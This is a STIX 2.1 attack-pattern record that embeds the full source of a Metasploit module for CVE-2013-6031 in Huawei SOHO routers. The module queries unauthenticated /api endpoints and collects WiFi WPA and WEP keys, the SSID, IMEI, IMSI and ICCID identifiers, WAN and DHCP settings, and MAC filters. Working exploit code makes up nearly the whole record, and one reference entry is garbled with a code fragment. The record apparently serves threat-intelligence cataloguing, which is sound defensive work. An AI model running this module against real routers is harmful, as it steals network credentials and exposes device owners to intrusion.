{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--217dacab-8731-446b-9a32-4ba09304b3d8",
    "created": "2024-08-14T16:31:26.843971Z",
    "modified": "2024-08-14T16:31:26.843975Z",
    "name": "\"Huawei Datacard Information Disclosure Vulnerability\"",
    "description": " This module exploits an unauthenticated information disclosure vulnerability in Huawei SOHO routers. The module will gather information by accessing the /api pages where authentication is not required, allowing configuration changes as well as information disclosure, including any stored SMS.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/huawei_wifi_info.rb",
            "external_id": "huawei_wifi_info.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6031"
        },
        {
            "source_name": "print_error(\"DidnotgetHTTP200",
            "external_id": "URLwasnotfound\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'base64'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  BASIC_INFO = {\n    'Device Name'      => /<DeviceName>(.*)<\\/DeviceName>/i,\n    'Serial Number'    => /<SerialNumber>(.*)<\\/SerialNumber>/i,\n    'IMEI'             => /<Imei>(.*)<\\/Imei>/i,\n    'IMSI'             => /<Imsi>(.*)<\\/Imsi>/i,\n    'ICCID'            => /<Iccid>(.*)<\\/Iccid>/i,\n    'Hardware Version' => /<HardwareVersion>(.*)<\\/HardwareVersion>/i,\n    'Software Version' => /<SoftwareVersion>(.*)<\\/SoftwareVersion>/i,\n    'WebUI Version'    => /<WebUIVersion>(.*)<\\/WebUIVersion>/i,\n    'Mac Address1'     => /<MacAddress1>(.*)<\\/MacAddress1>/i,\n    'Mac Address2'     => /<MacAddress2>(.*)<\\/MacAddress2>/i,\n    'Product Family'   => /<ProductFamily>(.*)<\\/ProductFamily>/i,\n    'Classification'   => /<Classify>(.*)<\\/Classify>/i\n  }\n\n  WAN_INFO = {\n    'Wan IP Address' => /<WanIPAddress>(.*)<\\/WanIPAddress>/i,\n    'Primary Dns'    => /<PrimaryDns>(.*)<\\/PrimaryDns>/i,\n    'Secondary Dns'  => /<SecondaryDns>(.*)<\\/SecondaryDns>/i\n  }\n\n  DHCP_INFO ={\n    'LAN IP Address'      => /<DhcpIPAddress>(.*)<\\/DhcpIPAddress>/i,\n    'DHCP StartIPAddress' => /<DhcpStartIPAddress>(.*)<\\/DhcpStartIPAddress>/i,\n    'DHCP EndIPAddress'   => /<DhcpEndIPAddress>(.*)<\\/DhcpEndIPAddress>/i,\n    'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\\/DhcpLeaseTime>/i\n  }\n\n  WIFI_INFO = {\n    'Wifi WPA pre-shared key'     => /<WifiWpapsk>(.*)<\\/WifiWpapsk>/i,\n    'Wifi Auth mode'              => /<WifiAuthmode>(.*)<\\/WifiAuthmode>/i,\n    'Wifi Basic encryption modes' => /<WifiBasicencryptionmodes>(.*)<\\/WifiBasicencryptionmodes>/i,\n    'Wifi WPA Encryption Modes'   => /<WifiWpaencryptionmodes>(.*)<\\/WifiWpaencryptionmodes>/i,\n    'Wifi WEP Key1'               => /<WifiWepKey1>(.*)<\\/WifiWepKey1>/i,\n    'Wifi WEP Key2'               => /<WifiWepKey2>(.*)<\\/WifiWepKey2>/i,\n    'Wifi WEP Key3'               => /<WifiWepKey3>(.*)<\\/WifiWepKey3>/i,\n    'Wifi WEP Key4'               => /<WifiWepKey4>(.*)<\\/WifiWepKey4>/i,\n    'Wifi WEP Key Index'          => /<WifiWepKeyIndex>(.*)<\\/WifiWepKeyIndex>/i\n  }\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Huawei Datacard Information Disclosure Vulnerability\",\n      'Description'    => %q{\n        This module exploits an unauthenticated information disclosure vulnerability in Huawei\n        SOHO routers. The module will gather information by accessing the /api pages where\n        authentication is not required, allowing configuration changes as well as information\n        disclosure, including any stored SMS.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jimson K James',\n          'Tom James <tomsmaily[at]aczire.com>', # Msf module\n        ],\n      'References'     =>\n        [\n          ['CWE', '425'],\n          ['CVE', '2013-6031'],\n          ['US-CERT-VU', '341526']\n        ],\n      'DisclosureDate' => '2013-11-11' ))\n\n    register_options(\n      [\n        Opt::RHOST('mobilewifi.home')\n      ])\n\n  end\n\n  # Gather basic router information\n  def run\n    get_router_info\n    print_line('')\n    get_router_mac_filter_info\n    print_line('')\n    get_router_wan_info\n    print_line('')\n    get_router_dhcp_info\n    print_line('')\n    get_wifi_info\n  end\n\n  def get_wifi_info\n\n    print_status(\"Getting WiFi Key details...\")\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => '/api/wlan/security-settings',\n      })\n\n    unless is_target?(res)\n      return\n    end\n\n    resp_body = res.body.to_s\n    log = ''\n\n    print_status(\"WiFi Key Details\")\n\n    wifi_ssid = get_router_ssid\n    if wifi_ssid\n      print_status(\"WiFi SSID: #{wifi_ssid}\")\n      log << \"WiFi SSID: #{wifi_ssid}\\n\"\n    end\n\n    WIFI_INFO.each do |k,v|\n      if resp_body.match(v)\n        info = $1\n        print_status(\"#{k}: #{info}\")\n        log << \"#{k}: #{info}\\n\"\n      end\n    end\n\n    report_note(\n      :host => rhost,\n      :type => 'wifi_keys',\n      :data => log\n    )\n  end\n\n  def get_router_info\n\n    print_status(\"Gathering basic device information...\")\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => '/api/device/information',\n      })\n\n    unless is_target?(res)\n      return\n    end\n\n    resp_body = res.body.to_s\n\n    print_status(\"Basic Information\")\n\n    BASIC_INFO.each do |k,v|\n      if resp_body.match(v)\n        info = $1\n        print_status(\"#{k}: #{info}\")\n      end\n    end\n  end\n\n  def get_router_ssid\n    print_status(\"Gathering device SSID...\")\n\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => '/api/wlan/basic-settings',\n      })\n\n    # check whether we got any response from server and proceed.\n    unless is_target?(res)\n      return nil\n    end\n\n    resp_body = res.body.to_s\n\n    # Grabbing the Wifi SSID\n    if resp_body.match(/<WifiSsid>(.*)<\\/WifiSsid>/i)\n      return $1\n    end\n\n    nil\n  end\n\n  def get_router_mac_filter_info\n    print_status(\"Gathering MAC filters...\")\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => '/api/wlan/mac-filter',\n      })\n\n    unless is_target?(res)\n      return\n    end\n\n    print_status('MAC Filter Information')\n\n    resp_body = res.body.to_s\n\n    if resp_body.match(/<WifiMacFilterStatus>(.*)<\\/WifiMacFilterStatus>/i)\n      wifi_mac_filter_status = $1\n      print_status(\"Wifi MAC Filter Status: #{(wifi_mac_filter_status == '1') ? 'ENABLED' : 'DISABLED'}\" )\n    end\n\n    (0..9).each do |i|\n      if resp_body.match(/<WifiMacFilterMac#{i}>(.*)<\\/WifiMacFilterMac#{i}>/i)\n        wifi_mac_filter = $1\n        unless wifi_mac_filter.empty?\n          print_status(\"Mac: #{wifi_mac_filter}\")\n        end\n      end\n    end\n  end\n\n  def get_router_wan_info\n    print_status(\"Gathering WAN information...\")\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => '/api/monitoring/status',\n      })\n\n    unless is_target?(res)\n      return\n    end\n\n    resp_body = res.body.to_s\n\n    print_status('WAN Details')\n\n    WAN_INFO.each do |k,v|\n      if resp_body.match(v)\n        info = $1\n        print_status(\"#{k}: #{info}\")\n      end\n    end\n  end\n\n  def get_router_dhcp_info\n    print_status(\"Gathering DHCP information...\")\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => '/api/dhcp/settings',\n      })\n\n    unless is_target?(res)\n      return\n    end\n\n    resp_body = res.body.to_s\n\n    print_status('DHCP Details')\n\n    # Grabbing the DhcpStatus\n    if resp_body.match(/<DhcpStatus>(.*)<\\/DhcpStatus>/i)\n      dhcp_status = $1\n      print_status(\"DHCP: #{(dhcp_status == '1') ? 'ENABLED' : 'DISABLED'}\")\n    end\n\n    unless dhcp_status && dhcp_status == '1'\n      return\n    end\n\n    DHCP_INFO.each do |k,v|\n      if resp_body.match(v)\n        info = $1\n        print_status(\"#{k}: #{info}\")\n      end\n    end\n  end\n\n  def is_target?(res)\n    # check whether we got any response from server and proceed.\n    unless res\n      print_error(\"Failed to get any response from server\")\n      return false\n    end\n\n    # Is it a HTTP OK\n    unless res.code == 200\n      print_error(\"Did not get HTTP 200, URL was not found\")\n      return false\n    end\n\n    # Check to verify server reported is a Huawei router\n    unless res.headers['Server'].match(/IPWEBS\\/1.4.0/i)\n      print_error(\"Target doesn't seem to be a Huawei router\")\n      return false\n    end\n\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-11 "
}